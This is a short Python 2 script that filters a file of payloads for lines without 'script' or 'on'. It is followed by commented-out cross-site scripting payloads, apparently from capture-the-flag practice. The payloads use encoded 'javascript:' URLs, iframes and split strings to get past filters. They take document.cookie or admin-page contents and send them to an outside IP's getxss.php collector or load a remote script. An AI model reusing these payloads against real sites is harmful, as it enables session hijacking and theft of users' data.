c = open('xssmisc.txt', 'r').readlines()

for i in c:
    if 'script' not in i and 'on' not in i:
        print i,

# var f=document.createElement('iframe');
# getElementById
# f.src='shellbox_admin.php';
# document.head.appendChild(f);
# f.onload = function() {
#     window.location="//115.159.196.171/ddctf/getxss.php?cc="+escape(window.frames[0].document.cookie);
# }

# <iframe id="f" src="shellbox_admin.php"><iframe%20src="javasc%09ript:src%3D%27<img%20src=http:%2F%2F115.159.196.171/pwnhub/getxss.php%3Fc%3D%27%2Bescape%28$('%23f')%29%2b%27>%27">

# <img src="http://115.159.196.171/pwnhub/getxss.php?x">

# <img src="http://115.159.196.171/pwnhub/getxss.php?url"><iframe%20src="javasc%09ript:document.cookie='orz=virink';new%20Image%28%29.src%3D%27<img%20src=http:%2F%2F115.159.196.171/pwnhub/getxss.php%3Fc%3D%27%2Bescape%28document.cookie%29%2b%27>%27">

# <iframe%20src="javasc%09ript:new%20Image%28%29.src%3D%27<img%20src=http:%2F%2F115.159.196.171/pwnhub/getxss.php%3Fc%3D%27%2Bescape%28document.getElementById('f').document%29%2b%27>%27">

# <img src="http://115.159.196.171/pwnhub/getxss.php?url"><iframe%20src="javasc%09ript:new%20Image%28%29.src%3D%27<img%20src=http:%2F%2Fgetxss.php%3Fc%3D%27%2Bescape%28document.cookie%29%2b%27>%27">

# <img src="http://115.159.196.171/pwnhub/getxss.php?url=id"><iframe src=http://127.0.0.1/shellbox_admin.php?id=827 />

# $.get("demo_test.html")

# v='';$.get('test_admin.php',function(result){v=escape(result)});
#
# <iframe id=f src="test_admin.php"></iframe><iframe%20src="javasc%09ript:new%20Image%28%29.src%3D%27<body><scri'%2b'pt'%2b'%20src=http:%2F%2Fwww.audit.virzz.com/xssjs.js?1'%2b%27>%27">
